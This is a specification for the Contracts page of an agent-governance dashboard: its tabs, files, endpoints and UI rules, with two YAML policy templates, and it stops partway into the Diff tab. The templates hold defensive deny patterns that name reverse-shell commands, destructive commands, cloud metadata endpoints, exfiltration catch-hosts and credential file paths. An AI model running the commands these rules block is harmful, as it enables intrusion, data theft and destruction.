# Contracts View — Full Specification (v2)

> **Status:** Ready for implementation
> **Scope:** Four-tab Contracts page — primary interface for managing contract bundles
> **Quality bar:** Must pass `PROMPT-FRONTEND-AUDIT.md` checklist. Must match Dashboard Home, Events Feed, and Approvals Queue in polish, interactivity, and real-time behavior.

---

## 0. Required Reading

Read in this order before writing any code:

1. `CLAUDE.md` — Architecture, non-negotiable principles, tech stack
2. `CONVENTIONS.md` — Terminology (binding), code conventions
3. `DASHBOARD.md` — Brand system, color tokens, semantic colors
4. `PROMPT-FRONTEND-AUDIT.md` — Quality gate checklist (this is the acceptance test)
5. `SDK_COMPAT.md` — Bundle endpoints, SSE event names, agent SDK contract
6. `.docs-style-guide.md` — Terminology reference
7. `~/project/edictum/docs/contracts/yaml-reference.md` — Complete YAML contract schema. Understand all four types (pre, post, session, sandbox), expression grammar, operators, action blocks, `observe_alongside`.
8. Existing polished views — Open Dashboard Home, Events Feed, Approvals Queue in the browser. This is the quality bar.

---

## 1. Architecture

### 1.1 Mental Model

| Tab | Question | User action |
|-----|----------|-------------|
| **Contracts** | "What are my rules?" | Read, understand, scan governance posture |
| **Versions** | "What exists and where is it deployed?" | Upload, deploy, rollback, browse history |
| **Diff** | "What changed and what would it affect?" | Compare versions, preview impact before deploying |
| **Evaluate** | "Will this contract catch what I expect?" | Test contracts against real or synthetic tool calls |

### 1.2 Design Principle

**Behavior over artifacts.** Don't show YAML files and text diffs. Show what contracts *do* — which rules fire, which agents are affected, what would change if you deploy. YAML is available but never the hero.

### 1.3 Architecture Exception: Evaluate Endpoint

`CLAUDE.md` Principle #2 states: *"The server NEVER evaluates contracts. Zero latency on tool calls."*

This rule exists to ensure **production evaluation** happens agent-side with zero latency. The `POST /api/v1/bundles/evaluate` endpoint introduced in this spec is a **development-time playground tool** — it is never called by agents during production execution. It exists solely for the dashboard Evaluate tab (manual testing and event replay).

**Action required:** Amend `CLAUDE.md` Principle #2 to read:

> All governance runs in the agent process. The server NEVER evaluates contracts in production. Zero latency on tool calls. Server stores events, manages approvals, pushes contract updates.
> **Exception:** `POST /api/v1/bundles/evaluate` is a development-time playground endpoint for testing contracts in the dashboard. It is never called by agents. Production evaluation remains agent-side only.

### 1.4 Existing Prototype — Remove and Rewrite

An earlier prototype exists at:
- `dashboard/src/pages/contracts.tsx` — page shell (v1, prototype quality)
- `dashboard/src/components/contracts/` — 13 files (types, parse-bundle, contract-row, type-section, yaml-sheet, deploy-dialog, bundle-header, upload-sheet, versions-tab, diff-renderer, diff-tab, playground-tab, index)

**Delete the entire `dashboard/src/components/contracts/` directory and the existing `pages/contracts.tsx` before starting.** The v2 implementation is a clean rewrite following the file structure below. Do not reuse any v1 code — it was audited as prototype-quality with duplicated utilities, no shared module usage, and broken light mode.

### 1.5 File Structure

Follows the pattern established by Events (`pages/events/`) and Approvals (`pages/approvals/`):

```
dashboard/src/pages/
  contracts.tsx                       ← Page shell (tab routing, SSE, data loading)
  contracts/
    contracts-tab.tsx                 ← Tab 1: Contracts (grouped by type)
    contract-row.tsx                  ← Single contract with expand/collapse
    contract-detail.tsx               ← Expanded detail (summary, when-tree, YAML snippet)
    contract-summary.tsx              ← Human-readable when-clause renderer
    versions-tab.tsx                  ← Tab 2: version list panel
    version-detail.tsx                ← Tab 2: selected version detail panel
    diff-tab.tsx                      ← Tab 3: orchestrator
    diff-summary.tsx                  ← Tab 3: contract-level change summary
    diff-impact.tsx                   ← Tab 3: impact preview (verdict changes)
    diff-yaml.tsx                     ← Tab 3: text diff view
    evaluate-tab.tsx                  ← Tab 4: mode toggle + orchestrator
    evaluate-manual.tsx               ← Tab 4: three-input manual evaluator
    evaluate-replay.tsx               ← Tab 4: event replay comparison
    bundle-header.tsx                 ← Shared: bundle name, version selector, env badges
    yaml-sheet.tsx                    ← Shared: full YAML slide-out panel
    upload-sheet.tsx                  ← Shared: upload flow slide-out
    deploy-dialog.tsx                 ← Shared: deploy confirmation dialog
    types.ts                          ← TypeScript interfaces for parsed contracts
    yaml-parser.ts                    ← js-yaml parse + type coercion + diff
```

**Every file must be under 200 lines.** The splits above are pre-calculated to meet this constraint.

### 1.6 Shared Modules — MUST Reuse

Do NOT re-implement any of these. Import from their existing locations:

| Module | Location | What it provides | Use for |
|--------|----------|-----------------|---------|
| `EnvBadge`, `ENV_COLORS` | `@/lib/env-colors` | Environment badge component + color map | All env badges (production, staging, development) |
| `verdictColor`, `VerdictIcon`, `VERDICT_STYLES` | `@/lib/verdict-helpers` | Verdict badge styling + icons | Evaluate tab results, replay verdict comparison |
| `formatRelativeTime` | `@/lib/format` | "15m ago", "2h ago" | Version timestamps, deployment times, "last triggered" |
| `truncate` | `@/lib/format` | String truncation | Revision hashes |
| `formatToolArgs`, `getArgsPreview` | `@/lib/format` | Tool args display | Evaluate tab inputs, replay event preview |
| `extractProvenance`, `contractLabel` | `@/lib/payload-helpers` | Contract name from event payload | Coverage data, replay event display |
| `extractArgsPreview` | `@/lib/payload-helpers` | Smart arg preview per tool type | Replay event rows |
| `isObserveFinding` | `@/lib/payload-helpers` | Detect observe-mode findings | Evaluate results display |
| `useDashboardSSE` | `@/hooks/use-dashboard-sse` | SSE subscription hook | Real-time updates |
| `ApiError` | `@/lib/api` | Error class | All API error handling |

### 1.7 shadcn Components

**Already installed:** Badge, Button, Card, Collapsible, Dialog, DropdownMenu, Input, InputGroup, Label, Popover, Resizable, ScrollArea, Select, Separator, Switch, Table, Tabs, Textarea, Tooltip, AlertDialog, Chart

**Install before starting:**

```bash
cd dashboard
pnpm dlx shadcn@latest add accordion sheet
```

Note: `sonner` package is already in `package.json`. The shadcn Sonner wrapper component may or may not be installed — check `components/ui/` and add if missing.

**Already in `package.json` (do NOT re-add):**
- `js-yaml` + `@types/js-yaml`
- `diff`
- `@tanstack/react-table`
- `@tanstack/react-virtual`

### 1.8 Light/Dark Color Rule

**MANDATORY for every colored element.** This is the pattern established across the codebase after fixing 40+ light-mode broken files:

```
bg-{color}-500/15 text-{color}-600 dark:text-{color}-400 border-{color}-500/30
```

Apply to:
- Mode badges: `enforce` = emerald, `observe` = amber
- Effect badges: `deny` = red, `warn` = amber, `approve` = blue, `redact` = purple
- Type badges: `pre` = amber, `post` = emerald, `session` = blue, `sandbox` = orange
- Env badges: Use `EnvBadge` from `@/lib/env-colors` (already follows this pattern)
- Verdict badges: Use `verdictColor` from `@/lib/verdict-helpers` (already follows this pattern)

**Never use:** bare `text-red-400` without the `text-red-600 dark:text-red-400` pair.

### 1.9 TanStack Table

`CLAUDE.md` mandates TanStack Table for data tables. Use it for:
- **Replay results table** (Tab 4) — has real columns: tool, agent, time, old verdict, new verdict, contract

**NOT TanStack Table:** The versions list (Tab 2 left panel) is a selection list, not tabular data — it uses `ScrollArea` with styled divs, matching the Events feed left panel pattern.

---

## 2. Backend Changes

### 2.1 New Endpoint: Evaluate (Playground)

```
POST /api/v1/bundles/evaluate
Auth: Dashboard cookie (require_dashboard_auth)
```

**Request:**
```json
{
  "yaml_content": "string",
  "tool_name": "string",
  "tool_args": {},
  "environment": "production",
  "agent_id": "test-agent",
  "principal": {
    "user_id": "string",
    "role": "string",
    "claims": {}
  }
}
```

**Response:**
```json
{
  "verdict": "denied",
  "mode": "enforce",
  "contracts_evaluated": [
    {
      "id": "block-sensitive-reads",
      "type": "pre",
      "matched": true,
      "effect": "deny",
      "message": "Sensitive file '/home/.env' denied."
    }
  ],
  "deciding_contract": "block-sensitive-reads",
  "policy_version": "sha256:...",
  "evaluation_time_ms": 2
}
```

**Implementation:** `src/edictum_server/routes/evaluate.py`

```python
from edictum import Edictum

@router.post("/api/v1/bundles/evaluate")
async def evaluate(body: EvaluateRequest, auth=Depends(require_dashboard_auth)):
    edictum_instance = Edictum.from_yaml_string(body.yaml_content)
    envelope = ToolEnvelope(
        tool_name=body.tool_name,
        args=body.tool_args,
        environment=body.environment or "production",
        principal=Principal(**body.principal) if body.principal else None,
    )
    result = edictum_instance.evaluate(envelope)
    # ... map result to response
```

Note: uses `edictum_instance`, not `guard` (per CONVENTIONS.md — "guard" is forbidden).

### 2.2 New Endpoint: Contract Coverage Stats

```
GET /api/v1/stats/contracts?since=ISO8601&until=ISO8601
Auth: Dashboard cookie
```

**Response:**
```json
{
  "coverage": [
    {
      "decision_name": "block-sensitive-reads",
      "total_evaluations": 142,
      "total_denials": 3,
      "total_warnings": 0,
      "last_triggered": "2026-02-27T10:44:31Z"
    }
  ],
  "total_events": 1247,
  "period_start": "2026-02-26T00:00:00Z",
  "period_end": "2026-02-27T00:00:00Z"
}
```

**Implementation:** SQL aggregation on `events` table, grouping by `payload->>'decision_name'`. Add to `src/edictum_server/routes/stats.py`.

### 2.3 New Endpoint: List Deployments

```
GET /api/v1/deployments?env=&limit=50
Auth: Dashboard cookie
```

**Response:** Array of `DeploymentResponse` (type already exists in `api/bundles.ts`). The `Deployment` model already exists in `db/models.py`. This just adds a query endpoint.

**Important:** Reuse the existing `DeploymentResponse` type. Do NOT create a duplicate `DeploymentHistoryItem`.

### 2.4 New SSE Event: bundle_uploaded

Add `"bundle_uploaded"` to `_DASHBOARD_EVENT_TYPES` in `src/edictum_server/push/manager.py`.

Fire from `routes/bundles.py` `upload()` after successful commit:

```python
push.push_to_dashboard(auth.tenant_id, {
    "type": "bundle_uploaded",
    "version": bundle.version,
    "revision_hash": bundle.revision_hash,
    "uploaded_by": auth.user_id,
})
```

Existing `contract_update` fires on deploy. New `bundle_uploaded` fires on upload. The Contracts page subscribes to both.

### 2.5 Frontend API Client Additions

Add to **`dashboard/src/lib/api/bundles.ts`** (not a new file, not a monolith):

```typescript
// --- Evaluate (playground) ---

export interface EvaluateRequest {
  yaml_content: string
  tool_name: string
  tool_args: Record<string, unknown>
  environment?: string
  agent_id?: string
  principal?: {
    user_id?: string
    role?: string
    claims?: Record<string, unknown>
  }
}

export interface ContractEvaluation {
  id: string
  type: "pre" | "post" | "session" | "sandbox"
  matched: boolean
  effect: "deny" | "warn" | "approve" | "redact" | null
  message: string | null
}

export interface EvaluateResponse {
  verdict: string
  mode: string
  contracts_evaluated: ContractEvaluation[]
  deciding_contract: string | null
  policy_version: string
  evaluation_time_ms: number
}

export function evaluateBundle(body: EvaluateRequest) {
  return request<EvaluateResponse>("/bundles/evaluate", {
    method: "POST",
    body: JSON.stringify(body),
  })
}

// --- Deployments list ---

export function listDeployments(env?: string, limit = 50) {
  const params = new URLSearchParams()
  if (env) params.set("env", env)
  params.set("limit", String(limit))
  return request<DeploymentResponse[]>(`/deployments?${params}`)
}
```

Add to **`dashboard/src/lib/api/stats.ts`**:

```typescript
export interface ContractCoverage {
  decision_name: string
  total_evaluations: number
  total_denials: number
  total_warnings: number
  last_triggered: string | null
}

export interface ContractStatsResponse {
  coverage: ContractCoverage[]
  total_events: number
  period_start: string
  period_end: string
}

export function getContractStats(since?: string, until?: string) {
  const params = new URLSearchParams()
  if (since) params.set("since", since)
  if (until) params.set("until", until)
  const qs = params.toString()
  return request<ContractStatsResponse>(`/stats/contracts${qs ? `?${qs}` : ""}`)
}
```

Add re-exports to **`dashboard/src/lib/api/index.ts`**:

```typescript
export { evaluateBundle, listDeployments } from "./bundles"
export { getContractStats } from "./stats"
export type { EvaluateRequest, EvaluateResponse, ContractEvaluation } from "./bundles"
export type { ContractCoverage, ContractStatsResponse } from "./stats"
```

---

## 3. Tab 1: Contracts — "What are my rules?"

### 3.1 Layout: Grouped by Type (V3)

Selected from five mockup variations. Type grouping maps to how edictum works: preconditions before execution, postconditions after, session limits across calls, sandboxes define boundaries.

```
┌─────────────────────────────────────────────────────────┐
│ Contracts            [View YAML] [Upload] [Deploy v5 ▸] │
│ ─── ◉ Contracts │ Versions │ Diff │ Evaluate ────────── │
│                                                         │
│ ┌ devops-agent  v5 ▾  │ default: enforce ──────────── ┐ │
│ │ observe alongside: on                                │ │
│ │           production: v3  staging: v4  development: v5│ │
│ └───────────────────────────────────────────────────── ┘ │
│                                                         │
│ [Search contracts...]                                   │
│                                                         │
│ 4 Precondition  1 Postcondition  1 Session  2 Sandbox   │
│                                                         │
│ ▼ Preconditions  4                                      │
│ ├ ▸ block-sensitive-reads   read_file  enforce deny     │
│ │   secrets dlp                        142 events ●     │
│ ├ ▸ block-destructive-bash  bash       enforce deny     │
│ │   destructive safety                  89 events ●     │
│ ├ ▸ prod-deploy-requires-senior  deploy  enforce deny   │
│ │   change-control production            3 events ●     │
│ └ ▸ prod-requires-ticket    deploy     enforce deny     │
│     change-control compliance            0 events ○     │
│                                                         │
│ ▼ Postconditions  1                                     │
│ └ ▸ pii-in-output          *           enforce warn     │
│     pii compliance                       5 events ●     │
│                                                         │
│ ▶ Sessions  1                                           │
│ ▶ Sandboxes  2                                          │
└─────────────────────────────────────────────────────────┘
```

### 3.2 Data Flow

1. On mount: `listBundles()` + `getContractStats()`
2. Default selected version: latest (or production-deployed if exists)
3. `getBundleYaml(selectedVersion)` → raw YAML string
4. Client-side parse with `js-yaml` → typed `ContractBundle`
5. Group contracts by type, merge coverage data
6. Render with Accordion + Collapsible

**SSE:** Subscribe via `useDashboardSSE`:
- `bundle_uploaded` → refresh bundle list, toast "Version vN uploaded"
- `contract_update` → refresh bundles + env badges, toast "vN deployed to {env}"

### 3.3 Search (required: audit checklist item "Search/filter where view has >10 items")

`Input` with `InputGroup` (matches Events filter pattern). Filters contracts by ID, tool name, tag, or summary text. Client-side filter — no API call.

### 3.4 Bundle Header (`bundle-header.tsx`)

- `Card` + `CardContent`
- Bundle name: `font-mono font-semibold`
- Version selector: `Select` — changing version reloads YAML + re-renders all contracts
- Default mode: `Badge` variant="outline" with mode color (see §1.8)
- **Observe alongside:** When `observe_alongside: true` is set on the bundle, show a small `Badge variant="outline"` with `bg-blue-500/15 text-blue-600 dark:text-blue-400 border-blue-500/30` reading "observe alongside". Hidden when `false` or not set.
- **Tool classifications:** When `tools` map is present, show a summary line: "11 tools classified (3 irreversible, 4 read, 2 write, 2 pure)" using `text-muted-foreground text-xs`. Clicking opens a `Collapsible` showing the full tool → side_effect mapping. If no `tools` map, hide this entirely.
- Environment badges: `EnvBadge` from `@/lib/env-colors` — dimmed (`opacity-40`) if version is NOT deployed there

### 3.5 Contract Row (`contract-row.tsx`)

Each row inside a type group:

| Element | Component | Color rule |
|---------|-----------|------------|
| Chevron | Part of `CollapsibleTrigger` | — |
| Contract ID | `<span className="font-mono text-sm">` | `text-foreground` |
| Tool | `<code className="rounded bg-muted px-1.5 py-0.5 text-xs text-muted-foreground">` | — |
| Mode | `Badge variant="outline"` | enforce: `bg-emerald-500/15 text-emerald-600 dark:text-emerald-400 border-emerald-500/30`<br>observe: `bg-amber-500/15 text-amber-600 dark:text-amber-400 border-amber-500/30` |
| Effect | `Badge variant="outline"` | deny: `bg-red-500/15 text-red-600 dark:text-red-400 border-red-500/30`<br>warn: `bg-amber-500/15 text-amber-600 dark:text-amber-400 border-amber-500/30`<br>approve: `bg-blue-500/15 text-blue-600 dark:text-blue-400 border-blue-500/30`<br>redact: `bg-purple-500/15 text-purple-600 dark:text-purple-400 border-purple-500/30` |
| Tags | `Badge variant="secondary"` `text-[10px]` | default muted |
| Coverage | Event count + dot | Fired: `bg-emerald-500` dot. Never triggered: `bg-zinc-300 dark:bg-zinc-600` dot |

### 3.6 Contract Detail (`contract-detail.tsx`)

Rendered inside `CollapsibleContent` when a row is expanded. Five sections:

1. **Human-readable summary** — from `contract-summary.tsx`
2. **Message template** — `then.message` field, `font-mono text-sm`
3. **When clause tree** — readable expression rendering (for pre/post) or boundaries (sandbox) or limits (session)
4. **Raw YAML snippet** — this contract's YAML only, inside `Collapsible` `<pre>` block
5. **Coverage link** — "N denials in last 24h" → links to Events feed filtered by `decision_name=contractId`

### 3.7 Human-Readable Summary Renderer (`contract-summary.tsx`)

Takes a parsed contract, returns a human-readable string:

- **Pre:** "Denies `{tool}` when `{when_readable}`"
- **Post:** "Warns on `{tool}` when `{when_readable}`" / "Redacts `{tool}` output when..."
- **Session:** "Max {max_tool_calls} tool calls, {max_attempts} attempts. Per-tool: {limits}"
- **Sandbox:** "Restricts `{tools}` to `{within}`, excluding `{not_within}`"

When clause rendering (recursive):
- `all: [...]` → "({child1}) AND ({child2})"
- `any: [...]` → "({child1}) OR ({child2})"
- `not: expr` → "NOT ({expr})"
- Leaf: `{selector} {operator} {value}` → "path contains .env, .secret"

Operator rendering: `contains` → "contains {value}", `contains_any` → "contains {comma-separated}", `matches` → "matches {value}", `equals` → "equals {value}", `not_in` → "not in [{values}]", `exists: false` → "is not set", `gt/gte/lt/lte` → "> / >= / < / <= {value}"

**Schema reference:** `~/project/edictum/docs/contracts/yaml-reference.md` documents the full expression grammar, all operators, and all contract types. Consult it for edge cases and operator behavior.

### 3.8 YAML Sheet (`yaml-sheet.tsx`)

- shadcn `Sheet` side="right" (~50% viewport width)
- `SheetHeader`: "devops-agent v5" + Copy button
- `ScrollArea` with `<pre>` for YAML content
- Copy: `navigator.clipboard.writeText()` + Sonner toast "Copied to clipboard"
- **Syntax highlighting:** CSS classes on YAML tokens. Keys in `text-blue-600 dark:text-blue-400`, string values in `text-emerald-600 dark:text-emerald-400`, comments in `text-muted-foreground`. Hand-roll with regex-based tokenizer — do NOT add `shiki` or `highlight.js` as a dependency. Keep it simple: split lines, match `key:`, `"string"`, `# comment` patterns, wrap in `<span>`.

### 3.9 States

**Loading:** `Loader2` spinner centered (matches Events pattern).
**Error:** `Card` with error message + retry button. "Failed to load contracts. [Retry]"
**Empty (no bundles):**
```
No contract bundles yet

Upload your first contract bundle to start
governing your agents.

[Upload Bundle]     [Use Starter Template]
```
"Use Starter Template" opens Upload Sheet with a template picker. Two options:

**Template picker:** `Select` dropdown inside the Upload Sheet:
- **"DevOps Agent (starter)"** — simple bundle, 6 contracts, good for getting started. Source: `~/project/edictum/src/edictum/yaml_engine/templates/devops-agent.yaml`
- **"Production Governance (advanced)"** — full L2 sandbox bundle, 11 contracts, demonstrates all contract types including sandboxes, observe mode, approval with timeout, wildcard tools. Source: `~/project/edictum-plan/contracts/governance-v5.yaml`

Inline both templates as constant strings in `upload-sheet.tsx`.

**Starter template: DevOps Agent**

```yaml
apiVersion: edictum/v1
kind: ContractBundle

metadata:
  name: devops-agent
  description: "Contracts for DevOps agents. Prod gates, ticket requirements, PII detection."

defaults:
  mode: enforce

contracts:
  - id: block-sensitive-reads
    type: pre
    tool: read_file
    when:
      args.path:
        contains_any: [".env", ".secret", "kubeconfig", "credentials", ".pem", "id_rsa"]
    then:
      effect: deny
      message: "Sensitive file '{args.path}' denied."
      tags: [secrets, dlp]

  - id: block-destructive-bash
    type: pre
    tool: bash
    when:
      any:
        - args.command: { matches: '\\brm\\s+(-rf?|--recursive)\\b' }
        - args.command: { matches: '\\bmkfs\\b' }
        - args.command: { contains: '> /dev/' }
    then:
      effect: deny
      message: "Destructive command denied: '{args.command}'."
      tags: [destructive, safety]

  - id: prod-deploy-requires-senior
    type: pre
    tool: deploy_service
    when:
      all:
        - environment: { equals: production }
        - principal.role: { not_in: [senior_engineer, sre, admin] }
    then:
      effect: deny
      message: "Production deploys require senior role (sre/admin)."
      tags: [change-control, production]

  - id: prod-requires-ticket
    type: pre
    tool: deploy_service
    when:
      all:
        - environment: { equals: production }
        - principal.ticket_ref: { exists: false }
    then:
      effect: deny
      message: "Production changes require a ticket reference."
      tags: [change-control, compliance]

  - id: pii-in-output
    type: post
    tool: "*"
    when:
      output.text:
        matches_any:
          - '\\b\\d{3}-\\d{2}-\\d{4}\\b'
    then:
      effect: warn
      message: "PII pattern detected in output. Redact before using."
      tags: [pii, compliance]

  - id: session-limits
    type: session
    limits:
      max_tool_calls: 20
      max_attempts: 50
    then:
      effect: deny
      message: "Session limit reached. Summarize progress and stop."
      tags: [rate-limit]
```

**Advanced template: Production Governance v5**

```yaml
apiVersion: edictum/v1
kind: ContractBundle

metadata:
  name: edictum-agent
  description: "Production governance v5 — L2 sandbox"

defaults:
  mode: enforce

tools:
  exec: { side_effect: irreversible }
  write_file: { side_effect: irreversible }
  edit_file: { side_effect: irreversible }
  read_file: { side_effect: read }
  list_dir: { side_effect: read }
  web_search: { side_effect: read }
  web_fetch: { side_effect: read }
  message: { side_effect: write }
  spawn: { side_effect: irreversible }
  cron: { side_effect: write }
  "mcp_*": { side_effect: irreversible }

contracts:
  - id: deny-destructive
    type: pre
    tool: exec
    when:
      args.command:
        matches: '.*(rm\s+-rf\s+/|mkfs|dd\s+if=/dev/|shutdown|reboot|kill\s+-9\s+1\b|chmod\s+777\s+/).*'
    then:
      effect: deny
      message: "Destructive: {args.command}"

  - id: deny-shells
    type: pre
    tool: exec
    when:
      args.command:
        matches: '.*(nc\s+.*-e|ncat\s+.*-e|bash\s+-i|/dev/tcp/|socat.*exec).*'
    then:
      effect: deny
      message: "Shell attack: {args.command}"

  - id: deny-exec-metadata
    type: pre
    tool: exec
    when:
      args.command:
        matches: '.*(169\.254\.169\.254|metadata\.google\.internal|metadata\.azure\.com).*'
    then:
      effect: deny
      message: "Cloud metadata blocked: {args.command}"

  - id: file-sandbox
    type: sandbox
    tools: [read_file, write_file, edit_file, list_dir]
    within:
      - /root/.nanobot/workspace
      - /tmp
    not_within:
      - /root/.nanobot/workspace/.git
    outside: deny
    message: "File access outside workspace: {args.path}"

  - id: exec-sandbox
    type: sandbox
    tools: [exec]
    allows:
      commands: [ls, pwd, echo, cat, head, tail, grep, find, sort,
                 wc, date, uname, whoami, id, df, du, ps, tree,
                 git, pip, pip3, python, python3, node, npm, npx, pnpm,
                 mkdir, touch, cp, mv, rm, tar, gzip, unzip, zip, diff,
                 curl, wget, docker, jq, yq, file, stat, which,
                 free, uptime, top, htop, history, env, printenv,
                 ssh-keygen, openssl, base64, md5sum, sha256sum,
                 apt, dpkg, lsof, ss, netstat, ip, ping, dig, nslookup,
                 sed, awk, cut, tr, xargs, tee, less, more]
    within:
      - /root/.nanobot/workspace
      - /tmp
    not_within:
      - /etc/shadow
      - /etc/sudoers
      - /etc/gshadow
      - /proc
      - /sys
      - /root/.ssh
      - /root/.git-credentials
      - /root/.nanobot/config.json
      - /var/run/secrets
    outside: approve
    message: "Command outside sandbox: {args.command}"

  - id: web-sandbox
    type: sandbox
    tools: [web_fetch]
    allows:
      domains: ['*']
    not_allows:
      domains: [169.254.169.254, metadata.google.internal, metadata.azure.com,
                webhook.site, requestbin.com, canarytokens.org,
                burpcollaborator.net, interactsh.com, pipedream.net, hookbin.com]
    outside: deny
    message: "Blocked endpoint: {args.url}"

  - id: observe-spawn
    type: pre
    mode: observe
    tool: spawn
    when: { tool.name: { exists: true } }
    then: { effect: deny, message: "Spawn: {args.task}" }

  - id: observe-cron
    type: pre
    mode: observe
    tool: cron
    when: { tool.name: { exists: true } }
    then: { effect: deny, message: "Cron: {args.schedule}" }

  - id: approve-mcp
    type: pre
    tool: "mcp_*"
    when: { tool.name: { exists: true } }
    then: { effect: approve, message: "MCP: {tool.name}", timeout: 120, timeout_effect: deny }

  - id: observe-all
    type: pre
    mode: observe
    tool: "*"
    when: { tool.name: { exists: true } }
    then: { effect: deny, message: "{tool.name}: {args}" }
```

### 3.10 Test Data: Governance v5 as Validation Bundle

The advanced template (`governance-v5.yaml`) exercises every feature the Contracts view must render correctly. Use it as the primary test bundle during development:

| Feature | Contracts that test it |
|---------|----------------------|
| Preconditions with regex `when` | `deny-destructive`, `deny-shells`, `deny-exec-metadata` |
| Sandbox with `within`/`not_within` | `file-sandbox`, `exec-sandbox` |
| Sandbox with `allows.commands` (long list) | `exec-sandbox` |
| Sandbox with `allows.domains` + `not_allows.domains` | `web-sandbox` |
| Sandbox `outside: approve` vs `outside: deny` | `exec-sandbox` (approve) vs `file-sandbox` (deny) |
| Observe mode contracts | `observe-spawn`, `observe-cron`, `observe-all` |
| Approval with timeout | `approve-mcp` (timeout: 120, timeout_effect: deny) |
| Wildcard tool patterns (`mcp_*`, `*`) | `approve-mcp`, `observe-all` |
| Tool classifications (`tools:` map with `side_effect`) | Top-level `tools` section |
| Mixed modes in one bundle | `enforce` default + `observe` overrides |

**Every component must render correctly with this bundle.** Specifically verify:
- `contract-summary.tsx` generates readable summaries for sandboxes (`within`/`not_within`/`allows`) and observe-mode contracts
- `contract-row.tsx` shows `approve` effect badge (blue) and `observe` mode badge (amber) correctly
- `bundle-header.tsx` doesn't break with a `tools` map present
- `contract-detail.tsx` renders `allows.commands` lists without overflow (long command list in `exec-sandbox`)
- Type grouping: 6 preconditions (3 enforce + 3 observe), 3 sandboxes, 0 postconditions, 0 sessions — verify empty groups are hidden

---

## 4. Tab 2: Versions — "What exists and where is it deployed?"

### 4.1 Layout: Two-Panel (follows Events pattern)

Left panel: version list (scrollable). Right panel: selected version detail.

```
┌──────────────────────────┬───────────────────────────┐
│ VERSIONS  [Upload New ▸] │ VERSION DETAIL             │
│ ─────────────────────── │                           │
│ v5  ● development        │ v5 — devops-agent          │
│     admin@example.com    │ sha256:e7f2a1... [Copy]   │
│     15m ago              │ Uploaded 15m ago            │
│ ─────────────────────── │ by admin@example.com        │
│ v4  ● staging            │                           │
│     admin@example.com    │ Deployed to:               │
│     1h ago               │ ● development (15m ago)    │
│ ─────────────────────── │                           │
│ v3  ● production         │ [Deploy to...  ▾]         │
│     admin@example.com    │                           │
│     17h ago              │ Changes from v4:           │
│ ─────────────────────── │ +1 added, ~1 modified      │
│ v2  (no deployments)     │ [View full diff →]         │
│     admin@example.com    │                           │
│     2d ago               │ ┌ YAML ─────────────────┐ │
│                          │ │ apiVersion: edictum/v1 │ │
│                          │ │ ...                    │ │
│                          │ └──────────────────────┘ │
└──────────────────────────┴───────────────────────────┘
```

### 4.2 Left Panel: Version List

- `ScrollArea` with styled version rows (NOT TanStack Table — this is a selection list, same as Events left panel)
- Timestamps: use `formatRelativeTime` from `@/lib/format`
- Hashes: use `truncate` from `@/lib/format`
- Env badges: `EnvBadge` from `@/lib/env-colors`
- **uploaded_by:** resolve UUID to email. If not resolvable, show truncated UUID with `Tooltip` showing full value.
- Currently deployed versions: colored left border (2px, env color)
- Versions with no deployments: `opacity-60`
- Hover: `hover:bg-muted/50` (matches Events list hover)
- Selected: `bg-muted/30 border-l-2 border-accent` (matches Events selected)

### 4.3 Right Panel: Version Detail (`version-detail.tsx`)

1. **Header:** version, bundle name, revision hash (truncated + copy via `Tooltip`), uploaded by, timestamp (`formatRelativeTime`)
2. **Deployment status:** which environments, when, by whom. Uses `EnvBadge` + `formatRelativeTime`.
3. **Deploy action:** `Select` (env picker) + `Button` → opens `deploy-dialog.tsx`
4. **Change summary:** "+N added, -N removed, ~N modified" vs previous version. Clickable → navigates to Diff tab with `?tab=diff&from={prev}&to={this}`.
5. **YAML preview:** `ScrollArea` + `<pre>` (reuse YAML highlighting from `yaml-sheet.tsx`)

### 4.4 Deploy Dialog (`deploy-dialog.tsx`)

shadcn `Dialog`:

```
Deploy v5 to production?

Environment: [production ▾]

Currently deployed: v3
Changes: +2 contracts, ~1 modified

[Cancel]              [Deploy v5 ▸]
```

- On confirm: `deployBundle(version, env)` → Sonner toast → SSE refreshes all views
- On error: Sonner toast with server error message
- Deploy button: amber (`bg-amber-600 hover:bg-amber-700 text-white`)

### 4.5 Upload Sheet (`upload-sheet.tsx`)

shadcn `Sheet` side="right":

- `Textarea` (monospace, large) — paste YAML
- Drag-drop zone: `onDragOver` / `onDrop`, read as text, populate textarea
  - **Accepted file types:** `.yaml`, `.yml`, `.txt`, `.md`. On drop, check file extension — if it doesn't match, show Sonner toast "Only YAML files are supported (.yaml, .yml, .txt, .md)".
- **Client-side validation before submit:** parse with `js-yaml`, check `apiVersion: "edictum/v1"`, check `kind: "ContractBundle"`, check `contracts` array. Show inline status:
  - Valid: checkmark badge + "8 contracts found"
  - Invalid: destructive `Badge` + error message
- "Load starter template" button → pastes devops-agent example (see §3.9)
- On submit: `uploadBundle(yamlContent)` → success toast → refresh version list → auto-select new version
- On 422: show server validation message inline

### 4.6 States

**Loading:** `Loader2` centered.
**Error:** Card with retry. "Failed to load versions. [Retry]"
**Empty:** "No versions yet. Upload your first contract bundle. [Upload Bundle]"

---

## 5. Tab 3: Diff — "What changed and what would it affect?"

### 5.1 Layout: Three Sections

```
┌─────────────────────────────────────────────────────┐
│ Compare: [v3 ▾] → [v5 ▾]    [Swap ⇄]              │
│                                                     │
│ ┌ Contract Changes ─────────────────────────────── ┐│
│ │ +1 added   -0 removed   ~2 modified   5 unchanged││
│ │                                                   ││
│ │ Added:    exec-sandbox (sandbox)                  ││
│ │ Modified: block-sensitive-reads — added .pem,     ││
│ │           id_rsa to contains_any list              ││
│ │ Modified: session-limits — max_tool_calls          ││
│ │           30 → 50                                 ││
│ └───────────────────────────────────────────────── ┘│
│                                                     │
│ ┌ Impact Preview ──────────────────────────────── ┐ │
│ │ Based on 50 most recent events:                  │ │
│ │ 42/50 evaluated, 8 failed (parse error)          │ │
│ │ 12 events would change verdict                   │ │
│ │ • 8: allowed → denied (block-sensitive-reads)    │ │
│ │ • 4: denied → allowed (session-limits relaxed)   │ │
│ │ [View affected events →]                         │ │
│ └──────────────────────────────────────────────── ┘ │
│                                                     │
│ ▶ YAML Diff  [Side-by-side │ Unified]               │
└─────────────────────────────────────────────────────┘
```

### 5.2 Section 1: Contract-Level Changes (`diff-summary.tsx`)

Parse both versions. Compare by contract `id`:
- **Added:** IDs in new version not in old
- **Removed:** IDs in old version not in new
- **Modified:** same ID, different content — show *what* changed in plain language
- **Unchanged:** count only, no detail

This is the primary diff. Most users never need the YAML diff below.

### 5.3 Section 2: Impact Preview (`diff-impact.tsx`)

Fetch recent events, evaluate each against both versions using `evaluateBundle()`, show verdict changes.

